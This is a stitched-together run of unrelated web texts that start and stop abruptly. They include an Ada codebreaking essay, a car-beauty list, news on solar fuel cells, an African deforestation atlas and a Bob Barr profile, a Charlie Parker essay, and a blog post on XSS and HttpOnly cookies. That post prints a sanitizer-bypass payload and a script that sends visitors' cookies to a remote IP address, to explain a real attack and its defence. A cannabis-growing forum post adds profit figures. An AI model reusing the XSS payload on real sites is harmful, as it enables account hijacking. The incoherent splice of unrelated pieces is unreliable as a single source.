On the other hand , I had the long - term goal of becoming more proficient in Ada , so I finally decided to use it in my code development for the Cipher Event , even if it might make reaching that short - term goal more difficult .
And I was again surprised by Ada : I had expected that I might be struggling with the features of a language that I did not know for long , but the programming in Ada turned out to be very enjoyable .
Ada allowed me to concisely express the algorithms I wanted to implement .
Computing the Fourier amplitudes of the frequencies of interest , convoluting the demodulated signal with the symbol patterns of the Baudot alphabet , and extracting the teleprinter symbol stream with clock recovery based on a phase - locked loop were all easily implemented in Ada .
Representing the SZ42 in software by declaring data types for the wheels and putting them together to a data type for the entire machine felt a bit like building a real machine piece by piece .
While implementing the cryptographic attacks on the SZ42 , I could concentrate on the design of the algorithms , while their representation in Ada was straightforward .
On November 15 , 2007 I took my laptop to the nearby radio shack of the amateur radio club of Bonn .
Being initially hampered by poor radio propagation and noise , I could finally record and decrypt several of the transmitted Cipher Challenges .
Running on a 1.4 GHz CPU , the Ada program that does the code breaking found the correct settings of all 12 key wheels of the SZ42 within 46 seconds .
This was way faster than Colossus , which completed the same task within about three and a half hours .
Colossus reads the ciphertext input from a punched paper tape looping at a speed of 5000 characters per second .
On my computer , I measured the equivalent speed to be about 1.2 million characters per second , which is 240 times faster .
When scaling the CPU frequency by this factor , Colossus is equivalent to a 5.8 - MHz computer .
Measured by Moore 's law , this is an enormous speed for a machine built more than six decades ago .
After my successful decryption of the messages , I felt very honored by received congratulations form Bletchley Park and by being invited to receive a prize for winning the challenge .
The trip was in January 2008 and seeing Colossus at work was much more exciting than watching my laptop .
Conclusion
Being a bit discouraged by Planck 's observation , I am not writing this to convince management people of the strengths of Ada .
For a long time , the language was only accessible to a more or less closed group of programmers due to the lack of a free compiler .
This and not any shortcomings of the language itself must be the reason why Ada has found only limited use in the past .
Thanks to the GPL version of the GNAT compiler that AdaCore contributed to the GNU Compiler Collection ( GCC ) , there is now an Ada compiler available that software enthusiasts can use free of charge .
This lets students to try out the language , and it lets universities offer programming courses based on Ada .
Computer geeks who can afford learning a language simply because it is cool have now access to an Ada compiler .
My hope is that some day they will grow into positions in IT industry and bring Ada into the widespread use that the language deserves , without having to convince anybody .
For prospective consumers looking to purchase a car as more than mere transportation , we decided it was time for the Jalopnik commentariat to put the ten most beautiful cars in the world currently for sale on a pedestal .
We 've done the ugliest cars at home and abroad , now it 's time to soothe your eyes with images of cars that 'll evoke your inner dragon .
To be considered truly beautiful , we decided a vehicle must transcend gimmicks and needless ornamentation to achieve an economy of design , eschewing the aggressiveness of most modern sports cars .
Instead , these cars capture the classic feminine qualities that have encouraged owners to refer to their cars as " she . "
Given this standard , we think the ten below are almost indisputably the most beautiful — thought that certainly wo n't stop you all from adding your own two cents in the comments below .

10 . Audi R8

Years of female empowerment public service announcements and deodorant ads have convinced us it 's possible to be both athletic and beautiful .
But even in a world without " Girl Power " the Audi R8 is extant proof that strong is sexy .
Despite its Lamborghini heritage , there are no scissor doors or fighter jet inspired vents .
The R8 is one of the few modern mid-engined cars that 's actually subtle and , therefore , the object of burglar 's desire .
9. Fiat 500
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
Like a beautiful handle on the entrance to a towering gothic church , the Fiat 500 is the epitome of a brilliant design sometimes overlooked .
Coming from the land and company that produces Lamborghinis and Ferraris it was the 500 that captured the European Car Of The Year trophy in 2007 .
Though quasi - retro , the inexpensive 500 stands out like a Hungarian wax pepper in a world of milquetoast economy cars .
We applaud Layabout for selecting it .
8. Citroen C6

Louis Armstrong famously said that " If you have to ask what Jazz is , you 'll never know . "
We think we can apply this sentiment to the Citroen C6 .
Clearly the funkiest car on our list , the Citroen nevertheless manages to capture everything wonderful about French car design .
The designers effectively grab one line at the nose and effortlessly stretch it back to the uniquely designed taillights .
It 's as though the car was painted in one stroke .
The integration of the Citroen logo into the grille is as attractive as it is clever .
No wonder that both Chirac and Muhnkee_2 chose the C6 as their official state cars .
7. Jaguar XK Coupe

Though not always the most reliable cars on the market , Jaguar coupes have traditionally set the standard for elegance and beauty and the latest Jaguar XK coupe is no exception .
An evolution of a design that goes back to the original E - type , the Jaguar is a design that gets better each time you look at it .
6. Audi RS6 Avant
Advertisement
Putting our bias towards wagons aside , the Audi RS6 Avant may be the most understated performance car on the planet .
Powered by a twin - tubro V10 , there are no huge wings , garish ground effects or blinding clusters of lights to hint at the car 's awesome ability .
As Parkington understands , the satin - finish trim around the Avant 's lusty grille and subtle extra lines quietly nod to the car 's ability while still maintaining it 's obvious class .
5. Cadillac CTS
Advertisement
Few sedans can compete with the supercars and GTs in the aesthetic department , and the few that rise to their level have historically been European .
It 's therefore a grand occasion that the Cadillac CTS , an American sedan , can compete with this esteemed company .
It 's as if all of those years of talking about " Cadillac Style " finally erupted forth into reality with the new CTS .
It 's a car both muscular and delicate , modern and timeless , yet luxurious and distinctly American .
The fact that Yoshi can actually afford one has nothing to do with its beauty though clearly something to do with its allure .
We can't wait for the Coupe and Sport Wagon versions to go on sale to show the world what the " Art & Science " design is all about .
4. Masererati GranTurismo
Advertisement
The Maserati GranTurismo lives up to its name as one of the grandest of tourers .
And even if it had the motor from an old Datsun and a transmission from a new Suzuki it would still be one of the quickest looking cars on the market .
Whether in normal or GranTurismo S trim , the Maserati leaves broken hearts in its wake .
Drop dead gorgeous from any angle , the integrated exhaust tips and triangular taillights combine for one of the best looking rears in the business .
We think Sandwich Pants would take it over Beyonce any day .
3. Alfa Brera
Advertisement
A consensus favorite among anyone with working optic nerves , the Alfa Romeo Brera redefines the term " hot hatch . "
The low greenhouse and high beltline combine for a stance that 's uncharacteristic of a hatchback and the sloping shoulders are surprisingly exotic .
But it 's the curved hood , which angles towards the nose in a way that 's almost F1 - esque , that causes our hearts to skip beats like Ferris Bueller skips school .
2. Aston Martin DB9
Advertisement
A list of beautiful cars without an Aston Martin would be as incomplete as a list of beautiful women without Scarlett Johansson .
But which Aston ?
The Vantage ?
The DBS ?
Though all Astons are powerful and gorgeous , the Aston Martin DB9 is the most classic example of what makes the classic British brand a flag - bearing standard of luxury and elegance .
Stripped of the menacing enhancements of those other Astons , the DB9 is like one smooth and flowing movement .
They say Michaelangelo had an eye for stone ,
It 's as if the designers crafted it from one piece of unadulterated marble for Dr. Danger to worship .
1. Alfa Romeo 8C Competizione
Advertisement
There 's a reason why we devoted a day to the Alfa Romeo Competizione and it is embodied in the photo above .
Not so much the creation of man , we assume , like the psalmists , it was God 's will manifest through human hands .
It outshines anything from Bugatti , Lamborghini or Ferrari while using a tenth of the lines of their simplest cars .
With perfectly round taillights ,
Alfa 's typical crest - shaped grille and ovular headlights it 's hard to put into words what makes the car so special .
We simply do n't have words that are good enough .
It 's everything that 's great about Italian cars and nothing that 's bad about them .
It 's a dream come true and you can actually buy one .
CAMBRIDGE , Massachusetts ( Reuters ) - A U.S. scientist has developed a new way of powering fuel cells that could make it practical for home owners to store solar energy and produce electricity to run lights and appliances at night .
A new catalyst produces the oxygen and hydrogen that fuel cells use to generate electricity , while using far less energy than current methods .
! ADVERTISEMENT !
With this catalyst , users could rely on electricity produced by photovoltaic solar cells to power the process that produces the fuel , said the Massachusetts Institute of Technology professor who developed the new material .
" If you can only have energy when the sun is shining , you 're in deep trouble .
And that 's why , in my opinion , photovoltaics have n't penetrated the market , " Daniel Nocera , an MIT professor of energy , said in an interview at his Cambridge , Massachusetts , office .
" If I could provide a storage mechanism , then I make energy 24/7 and then we can start talking about solar . "
Solar has been growing as a power source in the United States -- last year the nation 's solar capacity rose 45 percent to 750 megawatts .
But it is still a tiny power source , producing enough energy to meet the needs of about 600,000 typical homes , and only while the sun is shining , according to data from the Solar Energy Industries Association .
Most U.S. homes with solar panels feed electricity into the power grid during the day , but have to draw back from the grid at night .
Nocera said his development would allow homeowners to bank solar energy as hydrogen and oxygen , which a fuel cell could use to produce electricity when the sun was not shining .
" I can turn sunlight into a chemical fuel , now I can use photovoltaics at night , " said Nocera , who explained the discovery in a paper written with Matthew Kanan published on Thursday in the journal Science .
Companies including United Technologies
Corp produce fuel cells for use in industrial sites and on buses .
Automakers including General Motors Corp and Honda Motor
Co are testing small fleets of fuel - cell powered vehicles .
POTENTIAL FOR CLEAN ENERGY
Fuel cells are appealing because they produce electricity without generating the greenhouse gases associated with global climate change .
But producing the hydrogen and oxygen they run on typically requires burning fossil fuels .
That has prompted researchers to look into cleaner ways of powering fuel cells .
Another researcher working at Princeton University last year developed a way of using bacteria that feed on vinegar and waste water to generate hydrogen , with minimal electrical input .
James Barber , a biochemistry professor at London 's Imperial College , said in a statement Nocera 's work " opens up the door for developing new technologies for energy production , thus reducing our dependence on fossil fuels and addressing the global climate change problem . "
Nocera 's catalyst is made from cobalt , phosphate and an electrode that produces oxygen from water by using 90 percent less electricity than current methods , which use the costly metal platinum .
The system still relies on platinum to produce hydrogen -- the other element that makes up water .
" On the hydrogen side , platinum works well , " Nocera said .
" On the oxygen side ... it does n't work well and you have to put way more energy in than needed to get the ( oxygen ) out . "
Current methods of producing hydrogen and oxygen for fuel cells operate in a highly corrosive environment , Nocera said , meaning the entire reaction must be carried out in an expensive highly - engineered container .
But at MIT this week , the reaction was going on in an open glass container about the size of two shot glasses that researchers manipulated with their bare hands , with no heavy safety gloves or goggles .
" It 's cheap , it 's efficient , it 's highly manufacturable , it 's incredibly tolerant of impurity and it's from earth - abundant stuff , " Nocera explained .
Nocera has not tried to construct a full - sized version of the system , but suggested that the technologies to bring this into a typical home could be ready in less than a decade .
The idea , which he has been working on for 25 years , came from reflecting on the way plants store the sun 's energy .
" For the last six months , driving home , I 've been looking at leaves , and saying , ' I own you guys now , ' " Nocera said .

The natural wealth of Africa has been plundered over the past 35 years , as illustrated by a new atlas of satellite imagery from the United Nations Environmental Programme ( UNEP ) .
Roads now lace the untamed tracts of the rainforest in Congo — second only to the Amazon in size — bringing bushmeat hunting and logging wherever they lead .
In fact , the continent now loses 9.9 million acres ( four million hectares ) of forest a year , nearly one fourth of the world 's total deforestation .
Vast mines for copper , phosphate , gold and diamonds dig into the landscape throughout the continent , and the quest for oil eats up land in Chad , Nigeria and Equatorial Guinea .
Farming has taken a toll as well : 65 percent of the continent 's farmlands suffer some form of damage , including erosion , which contributes to the loss of 50 metric tons of soil per hectare per year .
But it 's not just the exploitation of natural resources driving environmental changes : Cities like Addis Ababa , Cairo and Dakar sprawl into the surrounding countryside — a reflection of the growing shift from rural to urban living that has exploded the latter from a city of a few hundred thousand to a major metropolitan area of 2.5 million people .
And climate change — a global disaster for which Africa bears little blame — shrinks glaciers and lakes , changes rainfall patterns and wreaks havoc on subsistence farmers .
More than 300 million people in Africa already do not have access to enough water , a number that is expected to grow as the globe continues to warm .
The following images are just a few of the thousands sent back to Earth from the U.S. Landsat satellites since they were launched starting in 1972 as well as those from more recently lofted orbital cameras .
UNEP 's " Africa : Atlas of Our Changing Environment " contains more than 300 such satellite pictures detailing human - induced changes in all 53 African countries , including those for the better such as holding back the encroaching desert with a green belt of trees in Niger .
But it is images like the shrinking of Lake Chad , which is only 5 percent of its 1973 size , and the melting glacier atop Kilimanjaro that are seemingly the most enduring legacy of change .

Torture Is Not a Methodist Family Value
Posted on Friday , May 9 , 2008 by wallwritings
Guest Column by Andrew Weaver
Editor ’s Note [ from James Wall ] : Andrew Weaver is a good friend of mine and a close observer of the United Methodist Church .
I asked him to write the first guest column for this blog .
Andrew is a United Methodist minister and research psychologist living in New York City .
He is a graduate of The Perkins School of Theology , SMU .
On April 8 , Southern Methodist University President R. Gerald Turner sent a letter to all the delegates of the South Central Jurisdictional Conference ( SCJ ) of the United Methodist Church ( UMC ) .
Turner wanted to persuade the delegates to support the proposed Bush library and partisan think - tank at the SMU Dallas campus .
Three days later , George W. Bush , who is to be honored by the Bush library , acknowledged that he has been deeply involved in the details of the torture he has authorized .
An ABC News report indicated : “ President Bush says he knew his top national security advisers discussed and approved specific details about how high - value al Qaeda suspects would be interrogated by the Central Intelligence Agency . ” 
According to White House sources , the discussions about torture techniques were so detailed that some of the “ interrogation sessions were almost choreographed ” .
Earlier , on March 8 , Bush vetoed legislation that would have banned water boarding and other methods of torture by government employees .
The legislation would have limited CIA agents to 19 less - aggressive tactics outlined in the U.S. Army field manual .
The president stated that the government “ needs to use tougher methods than the U.S. military to wrest information from terrorism suspects ” .
Water boarding has a long and sickening history .
It was used as a means of torture and coerced baptism during the Protestant Reformation .
During the Spanish Inquisition the Catholic Church used the torture to convert Jews , Mennonites , witches , and other suspected heretics .
It is a brutal and horrifying method in which the torturer immobilizes the victim on his or her back .
The head is tilted downward .
Water is poured over the face forcing the inhalation of water into the lungs .
As the victim gags and chokes , the terror of imminent death is pervasive .
In the supposedly “ less enlightened ”  18th century , the Methodist Church founder , John Wesley , explicitly spoke strongly against any torture of prisoners of war .
For Wesley , war is justifiable only on the principle of self - preservation : Prisoners of war are confined for the purpose of preventing them from harming their captors .
A war of self - preservation does not give a nation the right to torture , or kill , or to enslave an enemy when the war is over .
United Methodist Bishop Scott J. Jones of Kansas , a SMU trustee , describes Bush as a “ faithful member ”  of the United Methodist Church .
The Rev. Mark Craig , an SMU trustee and senior minister of the Highland Park Church in Dallas dismissed opponents of the library and think tank as a “ fringe group , a marginal group without any standing other than the fact they happen to be one of 8 million United Methodists ” .
The Bush family are members of the Highland Park Church .
President Bush refers to himself a “ proud Methodist ”  , but he has shown little sign of contrition , regret or repentance for his personal behavior which violates Methodist standards set long ago by John Wesley .
Instead , Bush attempts to justify himself and place a shield of protection around government officials who use torture .
The half billion dollar partisan think - tank to honor President Bush on the SMU campus is being designed by Karl Rove .
Neither SMU nor the United Methodist Church will have any control over the direction of the program or the people they hire .
Consider the implications : Scooter Libby as distinguished Chair of political ethics ?
This absence of university control was made clear in 2005 when , according to a New York Times story :
In outlining the project to prospective universities in 2005 , two officers of the foundation , Marvin P. Bush , a brother of the president , and Donald J. Evans , said the institute would be answerable to the foundation , not the university .
And they said : “ Part of its mission will be to further the domestic and international goals of the Bush administration , ”  including “ compassionate conservatism ”  and “ defeating terrorism . ” 
The South Central Jurisdictional Conference of the United Methodist Church will meet July 15 - 19 , to debate and then vote on whether to approve the construction of the Bush Library and think tank .
There will be 290 United Methodist clergy and laity delegates to that conference representing 1.83 million United Methodist church members from Texas , Oklahoma , New Mexico , Missouri , Kansas , Nebraska , Arkansas and Louisiana .
These delegates are the ultimate authority over the use of the land where the new project is scheduled to be built .
A significant majority of these delegates are progressives and moderates who have the power to say no to the construction of the library and the think tank honoring Bush .
To encourage delegates to consider a no vote , you may go to www.protectSMU.org and sign a petition protesting the Bush library on SMU ’s campus .

2. Stanley
We ’ve heard of the DARPA Challenge , a road race for autonomous vehicles through the Californian dessert for cash and prizes , and we love it .
Stanford University ’s entrant , which won the race , was called Stanley , a Volkswagen SUB modified with lots of radar , ground - sensing , and optical gear , all running Linux .
1. Large Hadron Collider
“ … Brookhaven has about 1,200 multicore x86 servers dedicated to the LHC , along with disk and tape storage that holds seven petabytes of data .
Ernst says Brookhaven will have to scale that storage up significantly by 2012 , when he expects to be storing 13 petabytes of Large Hadron Collider data .
Worldwide , the LHC computing grid will be comprised of about 20,000 servers , primarily running the Linux operating system .
Scientists at Tier - 2 sites can access these servers remotely when running complex experiments based on LHC data , Pordes says .
If scientists need a million CPU hours to run an experiment overnight , the distributed nature of the grid allows them to access that computing power from any part of the worldwide network , she says .
With the help of Tier - 1 sites such as Brookhaven , the goal is to make using the grid just as easy for universities as using their own internal networks , according to Pordes .

And get this northern farmer goes even cheaper ad uses 1k MH bulbs , he says commerical wise , not much difference in weight of buds in the end but a hell of a lot cheaper in price of bulbs , you can get 1k MH under a $ 100 .
3 of them , and your doing multiple pounds .
Some cheap wood beams , you may spend under a 1000 , and reap 5000 from first season , so omegafarmer , I think will be hunched over my first shelf of plants , the other 3 will be waist height and higher , and I think as closed in as your system is , and as complicated with moving parts shows which is easier , and im going to do exactly as some said and just set up drip lines to the pots .
A nice slow drip all day long and if one or two looks dry , yeah ill hand water .
Doesnt seem hard to me , ive been hand watering like many since the beginning .
and 3000 saved by not getting omega or cheaper alternatives of rotating
Bird II : " Loverman " and " Summertime "
By : Bernard Chazelle
One day , Bird was walking on Broadway with 50 cents in his pocket , his entire fortune .
He bumped into a blind beggar playing the accordion .
" Can you play ' All the Things You Are ' ? "
The accordionist said yes and obliged .
Bird turned to his friend and say " Whoa , he can play the chords ! "
He dropped 25 cents into the man 's bowl and walked on .
Half - an - hour later , Bird walked back and heard the same music again : he dropped his last 25 cents .
Nat Hentoff likes to tell this anecdote .
Once , at a bar , Bird insisted on playing country music on the jukebox .
He had no patience with the jibes of other jazzmen present that these were the corniest of sounds .
" No , " Bird insisted , " they 're telling stories that are real to them .
I want to hear what they 're saying .
I want to hear their stories . "
He heard the stories .
And he told them , too .
Bird always thought of his music as story telling .
Charlie Parker felt deeply about racism and the exploitation of his music that went with it .
When Babs Gonzales tried to get him off drugs , he snapped :
" Wait until everybody gets rich off your style and you do n't have any bread , then lecture me about drugs . "
Yet he did all he could to keep Red Rodney , a Jewish white trumpeter from Philly , off heroin .
He failed .
When he toured in the South with Rodney , a true friend , he had him pass off as a black albino to get around the ban on mixed - race bands .
He 'd boss him around on stage ostentatiously , " Come on , boy , get me my horn , " clearly enjoying the reverse racial stereotype .
When Bird moved to California , he was met with incomprehension : " They all hate my music . "
He ended up in a mental institution .
Bird 's music is like Mozart played in fast - forward .
Bird 's ability to say so much in so little time is unmatched .
In a one - minute solo , he gives you enough musical ideas to build the foundation of a whole symphony .
But Bird wo n't come to you .
You have to come to him .
But once you do , I guarantee you , you wo n't let go .
Bird 's tone is fabulous , and very unique .
He 's one of the easiest jazz instrumentalists to recognize .
The man really was a tenor sax player who happened to play alto .
He used an unplayable reed ( much like Stevie Ray Vaughn set his guitar to be virtually unplayable by anyone unwilling to bleed for it ) .
Perhaps only the trumpeter Clifford Brown could match his intense warmth .
Bird was first and foremost a bluesman .
Unlike , say , John Coltrane , who could outblues anyone but was not a blues musician at heart , Bird 's bebop 's innovations were all rooted in the Kansas - City blues of his youth .
I included two pieces that Bird aficionados love to hate .
On Lover Man , Bird can barely play , so devastating is his withdrawal from heroin .
He misses his intro and barely makes it through .
That same night he set fire to his hotel room and ended up spending 6 months at Camarillo State Hospital 's psychiatric ward .
Bird never forgave his producer for releasing this session .
But I agree with Charles Mingus that it is one the most poignant pieces of music ever recorded .
Summertime is part of the " Charlie Parker with Strings " recordings that the producer Norman Granz agreed to put together to commercialize Bird 's music .
It 's the sort of sell - out music that snobs and purists despise .
I love it , partly for an anecdotal reason .
Bird kept referring to this session as one of the happiest moments of his life .
His dream was to be Wynton Marsalis .
While he had to endure the " You boys " and enter hotels through the kitchen door , Bird craved respectability .
His secret ambition was to go to Paris to study composition .
His ultimate fantasy was to have dinner with Stravinsky and Picasso .
Playing " With Strings " was the closest he ever got to it .
Some of the tunes were recorded at Carnegie Hall .
Some of the musicians included members of the Boston Symphony .
The whole gig was his idea , not Granz's .
It gave Bird his fondest musical memories .

There ’s little evidence in Bob Barr ’s office that the former Republican congressman is on the verge of running for president .
There are no throngs of volunteers .
Telephones do not ring off the hook .
On a recent afternoon , a lone reporter paged through American Rifleman magazine while waiting for Barr to return from Starbucks .
“ Oh , we ’re very busy ! ” chirped his receptionist , who was surfing the Web for tourist spots Barr might visit on a trip to England .
More than a month after Barr , 59 , set up an “ exploratory committee ” to gauge how many Americans would vote for him as a Libertarian presidential candidate , he is still considering whether to enter the race .
Advertisement
The world inside the Beltway , it seems , is indifferent .
“ Unless he commits a felony between now and November , no one will ever remember he ran for president , ” said Charlie Cook , political analyst and editor of the Cook Political Report .
Yet there are rumblings among Republicans that Barr could steal crucial votes from John McCain in a tight November election .
Sean Hannity , the conservative talk show host , has branded Barr a “ spoiler , ” and a Newsweek contributing editor , George F. Will , has warned that Barr could be “ ruinous ” to McCain in the same way that Ralph Nader was to Al Gore in 2000 .
With less than two weeks before the Libertarian Party selects its presidential nominee , Barr will discuss his plans at a news conference Monday in Washington .
Advertisement
Perhaps best known as the Republican member of Congress who led the impeachment effort against President Clinton in 1999 , Barr was most recently in the public eye as the guy who ate cheese in “ Borat : Cultural Learnings of America for Make Benefit Glorious Nation of Kazakhstan . ”
A National Rifle Assn. board member who works with the American Civil Liberties Union , Barr is no mainstream conservative .
Since representing Georgia ’s 7th Congressional District from 1995 to 2003 , Barr has reinvented himself as a forceful critic of the Bush administration , crusading for smaller government and protection of civil liberties .
“ Shrinking the size , the scope , the power and the cost of government ” is his campaign mantra .
Barr , who joined the Libertarian Party in 2006 , identified his target voters as “ disaffected Republicans , true conservatives , ” but conceded that his odds of winning were “ certainly long . ”
But , he said , Republicans and Democrats “ have no God - given right ” to be the only parties that present national candidates .
Advertisement
“ Your vote for a candidate of principle is never a wasted vote , ” he said .
He spoke with disdain for mainstream politicians and pundits .
“ Maybe it ’s important that Sen .
Obama does not know how to bowl , or that Hillary Clinton can wolf down a shot of whiskey , ” he said .
“ But many people I speak with have a deep dissatisfaction .
. . .
There ’s a sense that government keeps getting bigger and bigger .
To the extent that people have a choice , it ’s the choice of voting for the party of big government or the party of bigger government . ”
Barr , who was born in Iowa and graduated from high school in Iran , does not appear to have a strong local base .
He moved to Georgia when President Reagan appointed him U.S. attorney for the Northern District of Georgia .
Advertisement
He does not fit the conventional model of the Southern politician .
“ Humorless , pessimistic , sarcastic to the point that his wife beeps him when he is on TV , ‘ Smile , honey , ’ ” is how the 2002 edition of the Almanac of American Politics describes him .
“ He says he has no close friends on Capitol Hill and usually sleeps in his office . ”
Barr upholds individual rights , but he does n’t think too highly of individuals :
The first law of his nationally syndicated radio show , “ Bob Barr ’s Laws of the Universe , ” is : “ The world is full of idiots . ”
He reserves particular scorn for the Republican Party .
In virtually every important area , he said , President Bush “ told the American people one thing and did another thing ” :
He promised to cap government spending but increased the federal budget from $ 1.9 trillion to $ 3.1 trillion .
He promised to withdraw from “ nation - building ” but ended up mired in a lengthy occupation of Iraq .
Advertisement
Barr ’s evolution from Republican to Libertarian can be traced back to Bush administration policies after Sept 11 .
Government intrusion became “ so pervasive and so oppressive , ” he said , that he reconsidered areas in which he had previously accepted a greater degree of government power .
“ Every person in their heart is a libertarian about something , ” he said , whether they want to home - school their children , run a small business or choose what lightbulbs to install in the living room .
Though he has more name recognition than other Libertarian candidates for president and might have the best chance of attracting Republicans who supported Ron Paul , Barr faces obstacles in his pursuit of the nomination .
As a Republican , he voted for the Patriot Act , was an uncompromising proponent of the war on drugs , and was a chief sponsor of the Defense of Marriage Act , which blocked any federal recognition of same - sex couples married by the states .
Advertisement
To appease Libertarian critics , Barr openly admitted that he regretted voting for the Patriot Act .
Since 2002 he has worked as a lobbyist for the Marijuana Policy Project , a cannabis policy reform group , and in 2004 he testified before Congress against an amendment to the U.S. Constitution to ban same - sex marriage .
Many of Barr ’s views would not appeal to Republicans , political experts say .
“ To the extent that there is broader dissatisfaction with McCain , that people are hungering for a different kind of Republicanism , Barr is n’t the man to capture it , ” said Roy L. Behr , a political consultant and coauthor of “ Third Parties in America : Citizen Response to Major Party Failure . ”
“ He is absolutely unpredictable to most Republicans . ”
Last week , Barr presented his pitch at a Rotary Club luncheon in the affluent Atlanta suburb of Sandy Springs .
Advertisement
It was a dream audience for Barr : conservative residents of a new city that seceded from an Atlanta county in 2005 in a conflict over government bureaucracy .
The crowd listened attentively as Barr outlined the importance of limiting government power .
Some nodded when he critiqued the dismal state of national political debate .
Everyone applauded as he stepped off the podium .
But would anyone actually vote for him ?
“ No , ” said William K. Snellings , the club ’s president .
“ It ai n’t going to happen . . . .
I agree with almost everything he says , but a vote for him is a vote for Obama or Clinton . ”

So I have this friend .
I 've told him time and time again how dangerous XSS vulnerabilities are , and how XSS is now the most common of all publicly reported security vulnerabilities -- dwarfing old standards like buffer overruns and SQL injection .
But will he listen ?
No .
He 's hard headed .
He had to go and write his own HTML sanitizer .
Because , well , how difficult can it be ?
How dangerous could this silly little toy scripting language running inside a browser be ?
As it turns out , far more dangerous than expected .
To appreciate just how significant XSS hacks have become , think about how much of your life is lived online , and how exactly the websites you log into on a daily basis know who you are .
It 's all done with HTTP cookies , right ?
Those tiny little identifiying headers sent up by the browser to the server on your behalf .
They 're the keys to your identity as far as the website is concerned .
Most of the time when you accept input from the user the very first thing you do is pass it through a HTML encoder .
So tricksy things like :
< script > alert ( ' hello XSS !') ;</ script>
are automagically converted into their harmless encoded equivalents :
< script > alert ( ' hello XSS !') ;</ script>
In my friend 's defense ( not that he deserves any kind of defense ) the website he 's working on allows some HTML to be posted by users .
It 's part of the design .
It 's a difficult scenario , because you can't just clobber every questionable thing that comes over the wire from the user .
You 're put in the uncomfortable position of having to discern good from bad , and decide what to do with the questionable stuff .
Imagine , then , the surprise of my friend when he noticed some enterprising users on his website were logged in as him and happily banging away on the system with full unfettered administrative privileges .
How did this happen ?
XSS , of course .
It all started with this bit of script added to a user 's profile page .
<img src= " " http://www.a.com/a.jpg<script type=text/javascript src= " http://1.2.3.4:81/xss.js " > " /><< img src= " " http://www.a.com/a.jpg</script> "
Through clever construction , the malformed URL just manages to squeak past the sanitizer .
The final rendered code , when viewed in the browser , loads and executes a script from that remote server .
Here 's what that JavaScript looks like :
window.location = " http://1.2.3.4:81/r.php?u= " +document.links [ 1] . text +" &l= " +document.links [ 1 ] +" &c=" +document.cookie ;
That 's right -- whoever loads this script - injected user profile page has just unwittingly transmitted their browser cookies to an evil remote server !
As we 've already established , once someone has your browser cookies for a given website , they essentially have the keys to the kingdom for your identity there .
If you do n't believe me , get the Add N Edit cookies extension for Firefox and try it yourself .
Log into a website , copy the essential cookie values , then paste them into another browser running on another computer .
That 's all it takes .
It 's quite an eye opener .
If cookies are so precious , you might find yourself asking why browsers do n't do a better job of protecting their cookies .
I know my friend was .
Well , there is a way to protect cookies from most malicious JavaScript : HttpOnly cookies .
When you tag a cookie with the HttpOnly flag , it tells the browser that this particular cookie should only be accessed by the server .
Any attempt to access the cookie from client script is strictly forbidden .
Of course , this presumes you have :
A modern web browser A browser that actually implements HttpOnly correctly
The good news is that most modern browsers do support the HttpOnly flag : Opera 9.5 , Internet Explorer 7 , and Firefox 3 .
I 'm not sure if the latest versions of Safari do or not .
It 's sort of ironic that the HttpOnly flag was pioneered by Microsoft in hoary old Internet Explorer 6 SP1 , a bowser which is n't exactly known for its iron - clad security record .
Regardless , HttpOnly cookies are a great idea , and properly implemented , make huge classes of common XSS attacks much harder to pull off .
Here 's what a cookie looks like with the HttpOnly flag set :
HTTP/1.1 200 OK Cache - Control : private Content - Type : text / html ; charset=utf - 8 Content - Encoding : gzip Vary : Accept - Encoding Server : Microsoft - IIS /7.0 Set - Cookie : ASP.NET_SessionId=ig2fac55 ; path=/ ; HttpOnly X - AspNet - Version : 2.0.50727 Set - Cookie : user=t=bfabf0b1c1133a822 ; path= / ; HttpOnly X - Powered - By : ASP.NET Date : Tue , 26 Aug 2008 10:51:08 GMT Content - Length : 2838
This is n't exactly news ; Scott Hanselman wrote about HttpOnly a while ago .
I 'm not sure he understood the implications , as he was quick to dismiss it as " slowing down the average script kiddie for 15 seconds " .
In his defense , this was way back in 2005 .
A dark , primitive time .
Almost pre YouTube .
HttpOnly cookies can in fact be remarkably effective .
Here 's what we know :
HttpOnly restricts all access to document .
cookie in IE7 , Firefox 3 , and Opera 9.5 ( unsure about Safari )
in IE7 , Firefox 3 , and Opera 9.5 ( unsure about Safari ) HttpOnly removes cookie information from the response headers in XMLHttpObject.getAllResponseHeaders ( ) in IE7 .
It should do the same thing in Firefox , but it does n't , because there 's a bug .
in IE7 .
It should do the same thing in Firefox , but it does n't , because there 's a bug .
XMLHttpObjects may only be submitted to the domain they originated from , so there is no cross -domain posting of the cookies .
The big security hole , as alluded to above , is that Firefox ( and presumably Opera ) allow access to the headers through XMLHttpObject .
So you could make a trivial JavaScript call back to the local server , get the headers out of the string , and then post that back to an external domain .
Not as easy as document .
cookie , but hardly a feat of software engineering .
Even with those caveats , I believe HttpOnly cookies are a huge security win .
If I -- er , I mean , if my friend -- had implemented HttpOnly cookies , it would have totally protected his users from the above exploit !
HttpOnly cookies do n't make you immune from XSS cookie theft , but they raise the bar considerably .
It 's practically free , a " set it and forget it " setting that 's bound to become increasingly secure over time as more browsers follow the example of IE7 and implement client - side HttpOnly cookie security correctly .
If you develop web applications , or you know anyone who develops web applications , make sure they know about HttpOnly cookies .
Now I just need to go tell my friend about them .
I 'm not sure why I bother .
He never listens to me anyway .

No lights , no camera , but there was action when Radiohead collaborated with Google to promote its latest video .
For its song “ House of Cards ” off the album “ In Rainbows , ” the band made a video using lasers and computer data but not cameras or lights .
Google is presenting the video , right , on its site ( code.google.com /radiohead ) as well as offering fans a short film to show how it was made .
The search engine is also allowing amateur developers to download some of the data and create their own variation of the video under a license that allows remixes .
According to Google , 64 lasers rotating and shooting landscapes in a 360 - degree radius 900 times per minute produced all the exterior scenes in the video , which also uses 3 - D technology .
Radiohead released the “ In Rainbows ” album online in October as a pay - what - you - want digital download .
Obama Assassination Plot Foiled in Colorado ( Photos , Video )
A routine traffic stop for a suspected drunken driver lead Aurora , Colorado police officers to apprehend a group that were allegedly plotting to assassinate the Democratic presidential presumptive nominee , , during his upcoming open air acceptance speech that will air on national television on Thursday night in front of a crowd of 70,000 .
Tharin Gartrell , a 28 year old convicted felon , was stopped when police observed his vehicle swerving between lanes early Sunday morning .
They found two high - powered scoped rifles , ammunition , sighting scopes , radios , a cellphone , a bulletproof vest , wigs , drugs and fake ID's .
As reported by Denver 's KCNC Channel 4 , under questioning Gartrell implicated three others -- Nathan Johnson , 32 , Shawn Adolph , 33 , and Natasha Gromack , who is Johnson 's girlfriend .
Adolph , who wore a ring with a Nazi swastika , was injured when he jumped out of a hotel window while fleeing Secret Service agents .
